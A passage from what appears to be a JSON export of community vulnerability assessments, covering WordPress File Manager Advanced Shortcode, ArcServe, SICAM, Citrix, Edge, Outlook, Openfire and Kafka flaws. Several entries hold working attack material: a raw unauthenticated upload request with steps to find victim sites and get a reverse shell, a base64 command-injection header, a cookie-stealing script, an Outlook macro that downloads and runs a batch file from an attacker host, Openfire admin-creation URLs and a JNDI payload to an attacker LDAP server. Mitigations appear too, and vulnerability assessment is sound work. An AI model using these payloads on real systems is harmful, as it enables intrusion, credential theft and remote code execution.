name=\"hide\"\r\n\r\nplugins\r\n------WebKitFormBoundary1vP3o9u9S2AIn7Ex\r\nContent-Disposition: form-data; name=\"operations\"\r\n\r\ndownload,upload\r\n------WebKitFormBoundary1vP3o9u9S2AIn7Ex\r\nContent-Disposition: form-data; name=\"path_type\"\r\n\r\ninside\r\n------WebKitFormBoundary1vP3o9u9S2AIn7Ex\r\nContent-Disposition: form-data; name=\"hide_path\"\r\n\r\nno\r\n------WebKitFormBoundary1vP3o9u9S2AIn7Ex\r\nContent-Disposition: form-data; name=\"enable_trash\"\r\n\r\nno\r\n------WebKitFormBoundary1vP3o9u9S2AIn7Ex\r\nContent-Disposition: form-data; name=\"upload_allow\"\r\n\r\nimage/png\r\n------WebKitFormBoundary1vP3o9u9S2AIn7Ex\r\nContent-Disposition: form-data; name=\"upload_max_size\"\r\n\r\n2G\r\n------WebKitFormBoundary1vP3o9u9S2AIn7Ex\r\nContent-Disposition: form-data; name=\"upload[]\"; filename=\"ruby.png\"\r\nContent-Type: image/png\r\n\r\nPNG\r\n<PNG content>\r\n\r\n------WebKitFormBoundary1vP3o9u9S2AIn7Ex\r\nContent-Disposition: form-data; name=\"mtime[]\"\r\n\r\n1687884791\r\n------WebKitFormBoundary1vP3o9u9S2AIn7Ex--\r\n```\r\nThe question is of course, what will happen if we start manipulating the parameters in the form data and issue a POST request again.\r\nWill that work?\r\nLets try an LFI, by manipulating the `path` parameter which is set to `wp-content` directory but will be set to empty (basically set to the wordpress root directory).\r\n\r\nSurprise, surprise !!!!\r\nruby.png get nicely uploaded in the wordpress root directory.\r\n```\r\nHTTP/1.1 200 OK\r\nDate: Tue, 27 Jun 2023 17:13:33 GMT\r\nServer: Apache/2.4.57 (Debian)\r\nAccess-Control-Allow-Origin: http://192.168.201.10\r\nAccess-Control-Allow-Credentials: true\r\nX-Robots-Tag: noindex\r\nX-Content-Type-Options: nosniff\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate\r\nReferrer-Policy: strict-origin-when-cross-origin\r\nX-Frame-Options: SAMEORIGIN\r\nPragma: no-cache\r\nSet-Cookie: PHPSESSID=h7komipqhl6l43bfq0beqgi23f; path=/\r\nContent-Length: 1742\r\nConnection: close\r\nContent-Type: application/json; charset=utf-8\r\n\r\n{\"added\":[\r\n   {\r\n     \"isowner\":false,\r\n     \"ts\":1687886014,\r\n     \"mime\":\"image\\/png\",\r\n     \"read\":1,\r\n     \"write\":1,\r\n     \"size\":\"592\",\r\n     \"hash\":\"l1_cnVieS5wbmc\",\r\n     \"name\":\"ruby.png\",\r\n     \"phash\":\"l1_Lw\",\r\n     \"tmb\":1,\r\n     \"url\":\"http:\\/\\/192.168.201.10\\/wordpress\\/ruby.png\"\r\n   }\r\n],\r\n```\r\nWhat if we try to bypass authentication by removing the cookies. Will that work?\r\nOf course, the file gets nicely uploaded again.\r\n\r\nLast but not least, can manipulate the mime-types to upload PNG images files with embedded PHP code that we can execute.\r\nAnd again the answer is yes. See this [video](https://youtu.be/2D-GBNQchPw) on `YouTube`.\r\n\r\nBasically,  you can manipulate all parameters as long as you have the `_fmakey`. This is the only parameter that needs to be set to issue a `POST` request that allows for all kind of operations, like upload, download and others.\r\n\r\nWhat is exactly this `_fmakey` and more important, where do we find it?\r\n\r\nI could not find much on this key, but we need to set this key to get the `POST` request satisfied.\r\nMan would think that it would be encrypted during runtime with a complex encryption algorithm, but the reality is much simpler.\r\nThe `_fmakey` and its value is stored on the web page where File Manager Advanced shortcode functionality is embedded. With view source you can easily find it on the web page (see the excerpt below).\r\n\r\n```html\r\n<script src='http://192.168.201.10/wordpress/wp-content/plugins/file-manager-advanced-shortcode/js/shortcode.js?ver=6.2.2' id='file_manager_advanced-fma-shortcode-js-js'></script>\r\n<script id='file_manager_advanced-fma-shortcode-js-js-after'>\r\njQuery(document).ready(function(){\r\n\tvar afmui = ['toolbar', 'tree', 'path', 'stat'];\r\n\tvar fma_ui_opt = '';\r\n\tif(fma_ui_opt != '') {\r\n\t  var fmui_params = fma_ui_opt;\r\n\tif(fmui_params == 'files') {\r\n\t  var afmui = [];\r\n\t} else \r\n\t  var afmui = fmui_params.split(',');\r\n\t }\r\n   jQuery('#file_manager_advanced').elfinder(\r\n\t  {\r\n\t\t  cssAutoLoad : false, \r\n\t\t  url : 'http://192.168.201.10/wordpress/wp-admin/admin-ajax.php',\t\t\t\t\t\t\r\n\t\t  lang:  'en',\t\t\t\t\t\r\n\t\t  defaultView : 'grid',\r\n\t\t  dateFormat : 'M d, Y h:i A',\r\n\t\t  customData : {action: 'fma_load_shortcode_fma_ui',\r\n\t\t _fmakey: 'd2ef442bd5',\r\n\t\t  path:'wp-content',\r\n\t\t  url: '',\r\n\t\t  w: 'false',\r\n\t\t  r: 'true',\r\n\t\t  hide: 'plugins',\r\n\t\t  operations: 'download,upload',\r\n\t\t  path_type: 'inside',\r\n\t\t  hide_path: 'no',\r\n\t\t  enable_trash: 'no',\r\n\t\t  upload_allow: 'image/png',\r\n\t\t  upload_max_size: '2G',\r\n\t      },\r\n\t\t  height: '',\r\n\t\t  width: '',\r\n\t\t  ui: afmui,\r\n\t  });\r\n});\r\n</script>\r\n```\r\nFor older versions of the plugin, you have to search for the `_fmakey` on the page embedded in the `fmaatts var`.\r\n```\r\nvar fmaatts = {\"ajaxurl\":\"http:\\/\\/192.168.201.55\\/wp-admin\\/admin-ajax.php\",\"lang\":\"us\",\"view\":\"grid\",\"dateformat\":\"M d, Y h:i A\",\"action\":\"fma_load_shortcode_fma_ui\",\"fmakey\":\"92b7949dd9\",\"path\":\"wp-content\\/uploads\\/musicfiles\",\"url\":\"\",\"w\":\"false\",\"r\":\"true\",\"hide\":\"plugins\",\"operations\":\"all\",\"path_type\":\"inside\"};\r\n```\r\nWell, how easy can you make it for an attacker to craft a `POST` request that uploads a malicious file with payload that can be executed.\r\nI would say, **DEAD EASY!!!**\r\n\r\nThe steps are simple.\r\n1. Find `WordPress` web sites with pages where the `_fmakey` is embedded (TIP: use a Source Code Search Engine like PublicWWW).\r\n2. Retrieve the `_fmakey`.\r\n3. Craft a `POST` request that uploads a malicious PNG file with PHP code embedded by using the `_fmakey` and manipulating the `cmd`, `operations` and `mime-types` parameters.\r\n4. Execute the malicious PNG file and enjoy a `reverse shell` or `meterpreter`.\r\n\r\nOf course, I took the liberty to code a nice Metasploit module that does it all for you.\r\nYou can find the module [here](https://github.com/h00die-gr3y/Metasploit/blob/main/wp_plugin_fma_shortcode_unauth_rce.rb) in my local repository or as [PR 18142](https://github.com/rapid7/metasploit-framework/pull/18142) at the Metasploit Github development.\r\n\r\nI have tested the module on a `WordPress` base installation version `6.2.2` on `Linux` and `Windows Server 2019` with `File Manager Advanced 5.0.5` and `File Manager Advanced Shortcode 2.3.2` installed.  Works as a charm...\r\n\r\nAlso tested the module with a basic setup of  `WordFence` and it bypassed the `WAF` as far as I could test it.\r\n\r\n### Mitigation\r\nPlease update your `File Manager Advanced` plugin to version `5.1` or higher and update the `File Manager Advanced Shortcode` plugin to version `2.4` or higher.\r\n\r\n### References\r\n[WPScan advisory](https://wpscan.com/vulnerability/58f72953-56d2-4d86-a49b-311b5fc58056)\r\n[File Manager Advanced Shortcode RCE - h00die-gr3y Metasploit local repository](https://github.com/h00die-gr3y/Metasploit/blob/main/wp_plugin_fma_shortcode_unauth_rce.rb)\r\n[Metasploit PR 18142](https://github.com/rapid7/metasploit-framework/pull/18142)\r\n[Exploit DB](https://www.exploit-db.com/exploits/51505)\r\n[Packet Storm](https://packetstormsecurity.com/files/172707/File-Manager-Advanced-Shortcode-2.3.2-Remote-Code-Execution.html)\r\n\r\n### Credits\r\n` Mateus Machado Tesser` Discovery\r\n",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "2def8eb9-1ee6-4198-b232-600ede64f834",
      "editorId": "dadd7295-ffae-449d-ba22-0a6feefa6f67",
      "topicId": "6ae89740-ba0a-4597-a9f9-7d4e763e7993",
      "created": "2023-06-27T16:30:58.655987Z",
      "revisionDate": "2023-06-27T16:30:58.656892Z",
      "document": "This vulnerability is trivial to exploit, particularly with proofs of concept (and a Metasploit PR) in the works.\r\n\r\nThe saving grace is that this doesn't appear to to be particularly common on the internet.. different Shodan queries show like 5-6 instances facing the internet.\r\n\r\nIf you do run this, though, patch ASAP! It's very easy remote root against the server.",
      "score": 1,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "cf90585e-3b88-484a-8508-8dd697b2c090",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "e6d1001b-c93f-4846-810d-a24dc7302352",
      "created": "2023-07-03T08:45:03.168337Z",
      "revisionDate": "2023-07-03T08:45:03.170085Z",
      "document": "Remote Code Execution in ArcServe UDP Backup\r\n\r\nA critical authentication bypass exists in ArcServe UDP Backup that affects versions 7.0 to 9.0.\r\nBy interacting with the service manipulating SOAP requests, it is possible to retrieve first details about the system including OS version, hostname, domain and administrator account name. \r\n\r\nBy forging a valid admin session with the discovered AuthUUID - ArcServe has an option to retrieve the admin password using the getLocalHostAsTrust method and request that from the ArcServe application.\r\n\r\nThe ArcServe application will return the value of the encrypted password that can be decrypted using the scripts provided by the authors of this vulnerability ( and in the reference link of this submission). ",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Credential Access",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "27b98314-c1cc-4f7c-8a38-26383ac32ce3",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "1176d039-6f3e-4791-91b4-8a50951a7c45",
      "created": "2023-07-03T12:10:08.435905Z",
      "revisionDate": "2023-07-03T12:10:08.435143Z",
      "document": "To exploit this vulnerability, an HTTP request including the command must be crafted. No */* characters can be used, therefore commands are encoded as base64, e.g., \"id\" as \u201caWQ=\". The command must be provided as UPLOADFILENAME header. \r\nA full command would look like this\r\necho aWQ=| base64 -d | sh #\r\n\r\nThe following header format must be obeyed:\r\ne User-Agent: SICAM TOOLBOX Il\r\n\u00a2 Session-ID: [ARBITRARY 16 CHARACTERS]\r\ne UPLOADFILENAME: [COMMAND]\r\n\r\nAdditionally, the request body must contain the following POST parameters:\r\n\u00ab type=20\r\n\u00ab length=[ARBITRARY]\r\n\u00a2 data=[ARBITRARY]\r\n\r\nIf it worked, the response body will be *type=21\", congrats you're root now.",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "9d673b7f-d965-49a8-902c-875951abc06b",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "4fac61df-ec11-485c-9105-3eb719da6489",
      "created": "2023-07-04T09:56:19.404089Z",
      "revisionDate": "2023-07-04T09:56:19.403749Z",
      "document": "Summary: \r\nA Cross-Site Scripting vulnerability has been discovered in Citrix ADC and Citrix Gateway versionslisted below.\r\n\r\nInsufficient sanitization of URL query parameters before their inclusion in an HTTP Location header poses a security risk. Exploiting this vulnerability allows an attacker to create a manipulated link that, upon being clicked, redirects the victim to an arbitrary destination. Additionally, the attacker can insert newline characters into the Location header, prematurely terminating the HTTP headers and injecting an XSS payload into the response body.\r\n\r\nImpact of vulnerability:\r\nAn attacker can leverage this vulnerability to construct malicious links that, when clicked, either redirect the victim to a website under the attacker's control or execute JavaScript code within the victim's browser.\r\n\r\nAffected Software:\r\nThe following versions of Citrix ADC and Citrix Gateway are susceptible to this vulnerability:\r\n\r\n    Citrix ADC and Citrix Gateway 13.1 before 13.1-45.61\r\n    Citrix ADC and Citrix Gateway 13.0 before 13.0-90.11\r\n    Citrix ADC and Citrix Gateway 12.1 before 12.1-65.35\r\n    Citrix ADC 12.1-FIPS before 12.1-55.296\r\n    Citrix ADC 12.1-NDcPP before 12.1-55.296\r\n\r\nMitigation:\r\nFollow the Citrix reference link to update to the latest versions that will fix the issue(s).",
      "score": 1,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        }
      ]
    },
    {
      "id": "42fd9001-b3c9-4430-bba5-b61cebd3964a",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "41479ef5-bf36-4709-a6bd-6ef19fd7b0d9",
      "created": "2023-07-06T09:59:35.795571Z",
      "revisionDate": "2023-07-07T10:24:40.177505Z",
      "document": "## [CVE-2023-33145](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-33145)\r\n\r\n## [Vendor](https://www.microsoft.com/en-us/edge?form=MY01BV&exp=e414)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/Windows11Exploits/main/2023/CVE-2023-33145/docs/Screenshot%202023-07-06%20123726.png)\r\n\r\n## Description:\r\nThe type of information that could be disclosed if an attacker successfully exploited this vulnerability is data inside the targeted website like IDs, tokens, nonces, cookies, IP, User-Agent, and other sensitive information.\r\nThe user would have to click on a specially crafted URL to be compromised by the attacker.\r\nIn this example, the attacker uses `STRIDE Threat Modeling` to spoof the victim to click on his website and done.\r\nThis is the general spoofing vulnerability and does not cover only EDGE, all browsers can be manipulated this way\r\non every OS. This will be hard to detect.\r\n\r\n```\r\nADD: 07.07.23\r\nThis is a general spoofing problem, and it is not connected only with Edge.\r\nFrom Microsoft writing bullshits again. This can happen on every OS.\r\n```\r\nBR\r\n\r\n## Conclusion:\r\nPlease be careful, for suspicious sites or be careful who sending you an link to open!\r\n\r\n## Staus: HIGH Vulnerability\r\n\r\n[+]Exploit:\r\n\r\n- Exploit Server:\r\n\r\n```js\r\n## This is a Get request from the server when the victims click! And it is enough to understand this vulnerability! =)\r\n\r\n<script> var i = new Image(); i.src=\"PoCsess.php?cookie=\"+escape(document.cookie)</script>\r\n\r\n## WARNING: The PoCsess.php will be not uploaded for security reasons!\r\n## BR nu11secur1ty\r\n\r\n```\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/Windows11Exploits/tree/main/2023/CVE-2023-33146)\r\n\r\n## Proof and Exploit\r\n[href](https://www.nu11secur1ty.com/2023/07/cve-2023-33145-microsoft-edge.html)\r\n\r\n## Time spend:\r\n01:30:00",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "0856a184-1881-4804-8edf-e5a32df6964a",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "f3c768c5-8ac7-44f8-b3aa-82917b1df0a8",
      "created": "2023-07-07T12:14:34.287379Z",
      "revisionDate": "2023-07-07T12:14:34.286337Z",
      "document": "## [CVE-2023-33131-Microsoft Outlook Remote Code Execution Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-33131)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/Windows11Exploits/main/2023/CVE-2023-33131/docs/Screenshot%202023-07-07%20144423.png)\r\n\r\n## Description:\r\nIn this vulnerability, the Microsoft Outlook app allows an attacker to send an infected Word file with malicious content \r\nto everyone who uses the Outlook app, no matter web or local.\r\nMicrosoft still doesn't have a patch against this 0-day vulnerability today.\r\n\r\n## Staus: HIGH Vulnerability\r\n\r\n[+]Exploit:\r\n\r\n- The malicious Word file:\r\n\r\n```js\r\nSub AutoOpen()\r\n  Call Shell(\"cmd.exe /S /c\" & \"curl -s https://attacker/namaikativputkata/sichko/nikoganqqsaopraite.bat > nikoganqqsaopraite.bat && .\\nikoganqqsaopraite.bat\", vbNormalFocus)\r\nEnd Sub\r\n\r\n```\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/Windows11Exploits/tree/main/2023/CVE-2023-33131)\r\n\r\n## Proof and Exploit\r\n[href](https://www.nu11secur1ty.com/2023/07/cve-2023-33131-microsoft-outlook.html)\r\n\r\n## Time spend:\r\n00:30:00",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "99255cbf-cc20-4d5f-96eb-8ecfdc43a29d",
      "editorId": "9b4259f3-1940-4986-a488-7122af9baecc",
      "topicId": "e0cbbc69-61ed-4d83-81a9-b9cc05150af0",
      "created": "2023-07-09T10:24:17.743182Z",
      "revisionDate": "2023-07-09T10:24:17.744622Z",
      "document": "it's not letting me authorize it in Microsoft authenticator\r\n",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Credential Access"
      },
      "tags": []
    },
    {
      "id": "f4676529-48bd-4e9e-bd31-df8c95d1413a",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "396fc30b-c817-4c58-8c47-a6ae2ab7c919",
      "created": "2023-07-09T11:42:53.268047Z",
      "revisionDate": "2023-12-19T13:55:19.153446Z",
      "document": "`Openfire` (previously known as Wildfire, and Jive Messenger) is an instant messaging (IM) and groupchat server for the Extensible Messaging and Presence Protocol (XMPP). It is written in Java and licensed under the Apache License 2.0.\r\n\r\nOn May 26, 2023, `Openfire's` administrative console, a web-based application, was found to be vulnerable to a path traversal attack via the setup environment using the path `http://localhost:9090/setup/setup-s/%u002e%u002e/%u002e%u002e/`. Endpoints such as `log.jsp`, `user-groups.jsp` and `user-create.jsp` can be used to gain unauthorized admin access.\r\nIt allows an unauthenticated user to use the unauthenticated `Openfire` Setup Environment in an already configured `Openfire` environment to access restricted pages in the `Openfire Admin Console` reserved for administrative users.\r\n\r\nThe vulnerability affects all versions of `Openfire` that have been released since April 2015, starting with version `3.10.0` and is patched in `Openfire` release `4.7.5`, `4.6.8` and `4.8.0` and later.\r\n\r\nReading the security advisory, it reminded me of a previous `Openfire` vulnerability [CVE-2008-6508](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2008-6508) discovered in 2008 that faced a similar issue. There is even an existing Metasploit module available a.k.a. `exploit\\multi\\http\\openfire_auth_bypass` that exploits this vulnerability (see Metasploit [PR 522](https://github.com/rapid7/metasploit-framework/pull/522)).\r\n\r\nWith that in mind, it should be not too difficult to build a new variant that exploits the latest vulnerability [CVE-2023-32315](https://nvd.nist.gov/vuln/detail/CVE-2023-32315).\r\n\r\nThe attack sequence is quite simple:\r\n1. Grab the cookies using the path traversal vulnerability via `http://<IP>:9090/setup/setup-s/%u002e%u002e/%u002e%u002e/user-groups.jsp`\r\n2. Use the cookies to add an admin user using the path traversal vulnerability via `http://<IP>:9090/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp`\r\n3. Upload an Openfire plugin weaponized with a java payload triggering an RCE via endpoint `http://<IP>:9090/plugin-admin.jsp`. For step 3, you need understand how to create an customized `Openfire` plugin which is described in more detail [here](https://download.igniterealtime.org/openfire/docs/latest/documentation/plugin-dev-guide.html).\r\n\r\nAnd as usual, I took the liberty to code a nice Metasploit module that does it all for you.\r\nYou can find the module [here](https://github.com/h00die-gr3y/Metasploit/blob/main/openfire_auth_bypass_rce_cve_2023_32315.rb) in my local repository or as [PR 18173](https://github.com/rapid7/metasploit-framework/pull/18173) at the Metasploit Github development.\r\n\r\nThis module has been tested on:\r\n\r\n**Ubuntu Linux 22.04**\r\n  - Openfire 3.10.1, 4.0.4, 4.1.0, 4.2.0, 4.3.0, 4.4.0, 4.5.0, 4.6.0. 4.7.0, 4.7.1, 4.7.3\r\n  - Java 7, 8, 17\r\n\r\n**Windows Server 2019 Datacenter**\r\n  - Openfire 4.7.3\r\n  - Java 20\r\n\r\nYou can setup your own testing environment  by following the instructions below.\r\n\r\n**Instructions for an Openfire installation:**\r\nDownload Openfire releases [here](https://github.com/igniterealtime/Openfire/releases?page=1).\r\nFollow installation instructions [here](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html).\r\n\r\n### Mitigation\r\nPlease update your `Openfire` application to version `4.8.0` or higher and or upgrade to the patched versions `4.7.5` or `4.6.8`.\r\n\r\n### References\r\n[Igniterealtime Security Advisory](https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm)\r\n[CVE-2023-32315](https://nvd.nist.gov/vuln/detail/CVE-2023-32315)\r\n[Openfire Authentication Bypass RCE - h00die-gr3y Metasploit local repository](https://github.com/h00die-gr3y/Metasploit/blob/main/openfire_auth_bypass_rce_cve_2023_32315.rb)\r\n[Metasploit PR 18173](https://github.com/rapid7/metasploit-framework/pull/18173)\r\n[Openfire plugin development](https://download.igniterealtime.org/openfire/docs/latest/documentation/plugin-dev-guide.html)\r\n[Openfire release downloads](https://github.com/igniterealtime/Openfire/releases?page=1)\r\n[Openfire installation instructions](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html)",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "f3503023-ff11-475e-851f-2bbbef6e0d35",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "225ca076-84b9-41e1-a42a-932d4567d005",
      "created": "2023-07-10T23:14:20.350056Z",
      "revisionDate": "2023-07-11T14:24:20.812202Z",
      "document": "# Description\r\nThis is an interesting JNDI vulnerability in Apache Kafka Connect. An unauthenticated attacker can archive RCE by hosting a payload on a malicious LDAP server and tricking the Kafka server into connecting to it and deserializing the LDAP response. This allows the attacker to execute java deserialization gadgets chains of the Kafka server.\r\n\r\nThe Kafka Connect REST API on vulnerable instances allow attackers to set the  `database.history.producer.sasl.jaas.config` connector property to `\"com.sun.security.auth.module.JndiLoginModule required user.provider.url=\"ldap://attacker_server\" useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" group.provider.url=\"xxx\";\"`. And \u201cboom goes the dynamite\u201d - with the right gadget chain you have RCE.\r\n\r\n# Attacker Rating and Exploitability. \r\nApache Kafka is middleware - it's not an application that will be just sitting on the edge of a network like a Firewall or a VPN. Apache Kafka is used by other applications adding a layer of abstraction to the exploit process. Lots of applications use it and a list of application that use it can be found [here](https://kafka.apache.org/powered-by#:~:text=Cloud%20Scale%C2%AE%20Inc%20uses,to%20communicate%20with%20one%20another.). How those applications use Kafka could vary making the exploit process different in each product. Apache Druid however uses Kafka and affected versions are vulnerable out of the box!\r\n\r\n# Apache Druid \r\nApache Druid uses Apache Kafka Connect by default and there\u2019s a metasploit module written to exploit this Kafka vulnerability on running inside Apache Druid.  I tested this with the Metasploit module linked above and the provided docker container (`image: vulhub/apache-druid:25.0.0`). I received a shell running in the context of the `root` user.\r\n",
      "score": 1,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    }
  ]
}